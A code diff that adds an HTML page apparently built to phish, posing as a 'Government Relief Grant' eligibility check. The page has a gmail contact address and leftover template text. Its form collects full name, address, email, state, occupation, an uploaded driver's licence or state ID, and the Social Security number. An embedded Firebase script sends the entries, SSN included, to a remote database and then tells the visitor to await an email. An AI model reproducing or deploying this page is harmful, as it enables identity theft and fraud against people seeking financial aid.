@@ -1,0 +1,370 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+   <!-- Firebase -->
+   <script src='https://cdn.firebase.com/js/client/2.2.1/firebase.js'></script>
+   <script src='https://ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js'></script>
+   <!-- basic -->
+   <meta charset="utf-8">
+   <meta http-equiv="X-UA-Compatible" content="IE=edge">
+   <!-- mobile metas -->
+   <meta name="viewport" content="width=device-width, initial-scale=1">
+   <meta name="viewport" content="initial-scale=1, maximum-scale=1">
+   <!-- site metas -->
+   <title>Govreliefgrant.com/Claim Grant</title>
+   <meta name="keywords" content="">
+   <meta name="description" content="">
+   <meta name="author" content="">
+   <!-- bootstrap css -->
+   <link rel="stylesheet" href="css/bootstrap.min.css">
+   <!-- style css -->
+   <link rel="stylesheet" href="css/style.css">
+   <!-- Responsive-->
+   <link rel="stylesheet" href="css/responsive.css">
+   <!-- fevicon -->
+   <link rel="icon" href="images/fevicon.png" type="image/gif" />
+   <!-- Scrollbar Custom CSS -->
+   <link rel="stylesheet" href="css/jquery.mCustomScrollbar.min.css">
+   <!-- Tweaks for older IEs-->
+   <link rel="stylesheet" href="https://netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.css">
+   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.5/jquery.fancybox.min.css"
+      media="screen">
+   <!--[if lt IE 9]>
+      <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
+      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script><![endif]-->
+</head>
+<!-- body -->
+
+<body class="main-layout">
+   <!-- loader  -->
+   <!-- <div class="loader_bg">
+         <div class="loader"><img src="images/loading.gif" alt="#" /></div>
+      </div> -->
+   <!-- end loader -->
+   <!-- header -->
+   <header>
+      <!-- header inner -->
+      <div class="header">
+         <div class="white_bg">
+            <div class="container-fluid">
+               <div class="row">
+                  <div class="col-xl-3 col-lg-3 col-md-3 col-sm-3 col logo_section">
+                     <div class="full">
+                        <div class="center-desk">
+                           <div class="logo">
+                              <a href="index.html">
+                                 <img src="images/logoo.png" alt="">
+                              </a>
+                           </div>
+                        </div>
+                     </div>
+                  </div>
+                  <div class="col-xl-9 col-lg-9 col-md-9 col-sm-9">
+                     <nav class="navigation navbar navbar-expand-md navbar-dark ">
+                        <button class="navbar-toggler" type="button" data-toggle="collapse"
+                           data-target="#navbarsExample04" aria-controls="navbarsExample04" aria-expanded="false"
+                           aria-label="Toggle navigation">
+                           <span class="navbar-toggler-icon"></span>
+                        </button>
+                        <div class="collapse navbar-collapse" id="navbarsExample04">
+                           <ul class="navbar-nav mr-auto">
+                              <li class="nav-item">
+                                 <a class="nav-link" href="index.html"> Home </a>
+                              </li>
+                              <li class="nav-item">
+                                 <a class="nav-link" href="#">About</a>
+                              </li>
+                              <li class="nav-item">
+                                 <a class="nav-link" href="#">Services </a>
+                              </li>
+                              <li class="nav-item">
+                                 <a class="nav-link" href="benefit.html">Beneficiaries</a>
+                              </li>
+
+                              <li class="nav-item active">
+                                 <a class="nav-link" href="index.html">Sign out </a>
+                              </li>
+                              <!-- <li class="nav-item">
+                                    <a class="nav-link" href="#">Contact Us</a>
+                                 </li> -->
+                              <!-- <li class="nav-item d_none le_co">
+                                    <a class="nav-link" href="#"><i  class="fa fa-user" aria-hidden="true"></i> Login</a>
+                                 </li>
+                                 <li class="nav-item d_none le_co">
+                                    <a class="nav-link" href="#"><i  class="fa fa-search" aria-hidden="true"></i></a>
+                                 </li> -->
+                           </ul>
+                        </div>
+                     </nav>
+                  </div>
+               </div>
+            </div>
+            <!-- end header inner -->
+            <!-- end header -->
+
+            <div id="banner1" class="carousel slide" data-ride="carousel">
+
+
+
+               <h2 style="color: #fbca47; font-weight: 800; text-align: center; margin-top: 20px;"> Eligbility Check
+               </h2>
+
+               <div class="contact ">
+                  <div class="container">
+                     <div class="row">
+                        <div class="col-md-12">
+                           <div class="titlepage">
+                              <h2> <span class="yellow">Kindly Fill the form </span><br> To Know your Eligbility Status
+                              </h2>
+                           </div>
+                        </div>
+                     </div>
+                     <div class="row">
+                        <div class="col-md-10 offset-md-1">
+                           <form id="contac_form" class="contac_form">
+                              <div class="row">
+                                 <div class="col-md-12 ">
+                                    <input class="contac_control" placeholder="FullName" type="type" name="name"
+                                       id="name" required>
+                                 </div>
+                                 <div class="col-md-12">
+                                    <input class="contac_control" placeholder="Address" type="type" name="Phone Number"
+                                       id="address">
+                                 </div>
+                                 <div class="col-md-12">
+                                    <input class="contac_control" placeholder="Email Address" type="type" name="email"
+                                       id="email">
+                                 </div>
+                                 <div class="col-md-12">
+                                    <select name="languages" id="state" class="contac_control">
+                                       <option value="">Select Your State</option>
+                                       <option value="Alabama"> Alabama</option>
+                                       <option value="Alaska">Alaska</option>
+                                       <option value="Arizona">Arizona</option>
+                                       <option value="Arkansas">Arkansas</option>
+                                       <option value="California">California</option>
+                                       <option value="Colorado">Colorado</option>
+                                       <option value="Connecticut">Connecticut</option>
+                                       <option value="Delaware">Delaware</option>
+                                       <option value="Florida">Florida</option>
+                                       <option value="Georgia">Georgia</option>
+                                       <option value="Hawaii">Hawaii</option>
+                                       <option value="Idaho">Idaho</option>
+                                       <option value="Illinois">Illinois</option>
+                                       <option value="Indiana">Indiana</option>
+                                       <option value="Iowa">Iowa</option>
+                                       <option value="Kansas">Kansas</option>
+                                       <option value="Kentucky">Kentucky</option>
+                                       <option value="Louisiana">Louisiana</option>
+                                       <option value="Maine">Maine</option>
+                                       <option value="Maryland">Maryland</option>
+                                       <option value="Massachusetts">Massachusetts</option>
+                                       <option value="Michigan">Michigan</option>
+                                       <option value="Minnesota">Minnesota</option>
+                                       <option value="Mississippi">Mississippi</option>
+                                       <option value="Missouri">Missouri</option>
+                                       <option value="MontanaNebraska">MontanaNebraska</option>
+                                       <option value="Nevada">Nevada</option>
+                                       <option value="New Jersey">New Jersey</option>
+                                       <option value="New Mexico">New Mexico</option>
+                                       <option value="New Mexico">New Mexico</option>
+                                       <option value="North Carolina">North Carolina</option>
+                                       <option value="">North Dakota</option>
+                                       <option value="Ohio">Ohio</option>
+                                       <option value="Oklahoma">Oklahoma</option>
+                                       <option value="Oregon">Oregon</option>
+                                       <option value="Pennsylvania">Pennsylvania</option>
+                                       <option value="Rhode Island">Rhode Island</option>
+                                       <option value="South Carolina">South Carolina</option>
+                                       <option value="South Dakota">South Dakota</option>
+                                       <option value="Tennessee">Tennessee</option>
+                                       <option value="Texas">Texas</option>
+                                       <option value="Utah">Utah</option>
+                                       <option value="Vermont">Vermont</option>
+                                       <option value="Virginia">Virginia</option>
+                                       <option value="Washington">Washington</option>
+                                       <option value="West Virginia">West Virginia</option>
+                                       <option value="Wisconsin">Wisconsin</option>
+                                       <option value="Wyoming">Wyoming</option>
+
+                                    </select>
+
+                                 </div>
+                                 <div class="col-md-12">
+                                    <input class="contac_control" placeholder="City" type="type" name="city" id="city">
+                                 </div>
+                                 <div class="col-md-12">
+                                    <input class="contac_control" placeholder="Zip Code" type="type" name="zipcode"
+                                       id="zipcode">
+                                 </div>
+                                 <div class="col-md-12">
+                                    <select name="languages" id="marital" class="contac_control">
+                                       <option value="">Marital Status</option>
+                                       <option value="single">Single</option>
+                                       <option value="married">Married</option>
+                                       <option value="Divorced">Divorced</option>
+                                       <option value="widowed">Widowed</option>
+                                    </select>
+                                 </div>
+                                 <div class="col-md-12">
+                                    <input class="contac_control" placeholder="Occupation" type="type" id="occupation">
+                                 </div>
+                                 <div class="col-md-12">
+                                    <input class="contac_control" placeholder="State ID or Driver's Licence" type="file"
+                                       id="idcard">
+                                 </div>
+                                 <div class="col-md-12">
+                                    <input class="contac_control" placeholder="SSN" type="password" id="ssn" required>
+                                 </div>
+
+                                 <div class="col-md-12">
+
+                                    <input type="submit" value="submit" class="send_btn" id="submit">
+                                 </div>
+                                 <div class="col-md-12 message">
+                                    <div class="success" id="success">
+                                       Successfull! <br> Kindly Check your email for your status.
+                                    </div>
+                                    <div class="danger" id="danger">
+                                       Fields Can't be empty!
+                                    </div>
+                                 </div>
+                              </div>
+                           </form>
+                        </div>
+                     </div>
+
+                  </div>
+               </div>
+            </div>
+
+            </a>
+         </div>
+         </section>
+      </div>
+      </div>
+   </header>
+   <!-- end banner -->
+
+
+
+   <!--  footer -->
+
+   <footer>
+      <div class="footer">
+         <div class="container">
+            <div class="row">
+               <div class="col-lg-3 col-md-6 col-sm-6">
+                  <a class="logo2" href="index.html">
+                     <img src="images/logoo.png" alt="#" />
+
+                  </a>
+                  <div class="follow">
+                     <p> This is a government and state development initiative that awards grants totaling billions of
+                        dollars to numerous organizations every year.</p>
+                  </div>
+               </div>
+               <div class="col-lg-3 col-md-6 col-sm-6">
+                  <h3>Quick link</h3>
+                  <ul class="link_icon">
+                     <li class="active"> <a href="#"> <i class="fa fa-chevron-right"
+                              aria-hidden="index.html"></i>Home</a></li>
+                     <li> <a href="#"> <i class="fa fa-chevron-right" aria-hidden="blog"></i>About </a></li>
+                     <li> <a href="#"> <i class="fa fa-chevron-right" aria-hidden="contact"></i>Beneficiary List</a>
+                     </li>
+                     <li> <a href="#"> <i class="fa fa-chevron-right" aria-hidden="blog"></i>Wallet</a></li>
+                     <li> <a href="#"> <i class="fa fa-chevron-right" aria-hidden="contact"></i>Subscribe</a></li>
+                  </ul>
+               </div>
+               <div class="col-lg-3 col-md-6 col-sm-6">
+                  <h3>Follow Us </h3>
+                  <div class="follow">
+                     <ul class="social_icon">
+                        <li> <a href="#"><i class="fa fa-facebook-f"></i></a></li>
+                        <li> <a href="#"><i class="fa fa-twitter"></i></a></li>
+                        <li> <a href="#"> <i class="fa fa-linkedin" aria-hidden="true"></i></a></li>
+                        <li> <a href="#"><i class="fa fa-instagram"></i></a></li>
+                     </ul>
+                  </div>
+               </div>
+               <div class="col-lg-3 col-md-6 col-sm-6">
+                  <h3>Contact us</h3>
+                  <ul class="location_icon">
+                     <li><a href="#"><i class="fa fa-map-marker" aria-hidden="true"></i></a>Reader will be dis<br>
+                        tracted by the reada
+                     </li>
+                     <li><a href="#"><i class="fa fa-envelope" aria-hidden="true"></i></a>Govreliefgrant@gmail.com</li>
+                     <li><a href="#"><i class="fa fa-volume-control-phone" aria-hidden="true"></i></a>+1 909 6675 686
+                     </li>
+                  </ul>
+               </div>
+            </div>
+         </div>
+         <div class="copyright">
+            <div class="container">
+               <div class="row">
+                  <div class="col-md-10 offset-md-1">
+                     <p>Copyright 2023 All Right Reserved By<a> Government Relief Grant</a></p>
+                  </div>
+               </div>
+            </div>
+         </div>
+      </div>
+   </footer>
+   <!-- end footer -->
+   <!-- Javascript files-->
+   <script src="js/jquery.min.js"></script>
+   <script src="js/popper.min.js"></script>
+   <script src="js/bootstrap.bundle.min.js"></script>
+   <script src="js/jquery-3.0.0.min.js"></script>
+   <!-- sidebar -->
+   <script src="js/jquery.mCustomScrollbar.concat.min.js"></script>
+   <script src="js/custom.js"></script>
+   <script src="js/claim.js"></script>
+
+   <script type="module">
+
+      // Import the functions you need from the SDKs you need
+      import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
+      import { getDatabase, ref, set, get, child } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-database.js";
+
+      import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-analytics.js";
+
+      // For Firebase JS SDK v7.20.0 and later, measurementId is optional
+      const firebaseConfig = {
+         apiKey: "AIzaSyD-NiS4D6icFkYlNf8j8y_QRz-qqRmtElg",
+         authDomain: "gov-grant-df331.firebaseapp.com",
+         projectId: "gov-grant-df331",
+         storageBucket: "gov-grant-df331.appspot.com",
+         messagingSenderId: "422465263267",
+         appId: "1:422465263267:web:9a5ccbb98112355250d116"
+      };
+
+      // Initialize Firebase
+      const app = initializeApp(firebaseConfig);
+      const analytics = getAnalytics(app);
+
+      //get ref to database services
+      const db = getDatabase(app);
+
+      document.getElementById("submit").addEventListener('click', function(e) {
+         e.preventDefault();
+         set(ref(db, 'user/' + document.getElementById("name").value),
+            {
+               username: document.getElementById("name").value,
+               email: document.getElementById("email").value,
+               phone: document.getElementById("address").value,
+               state: document.getElementById("state").value,
+               ssn: document.getElementById("ssn").value,
+               ssn: document.getElementById("ssn").value, 
+               occupation: document.getElementById("occupation").value
+            });
+         alert("Submit Successful kindly check " + email.value + " For a verification message");
+      })
+
+   </script>
+
+</body>
+
+</html>   
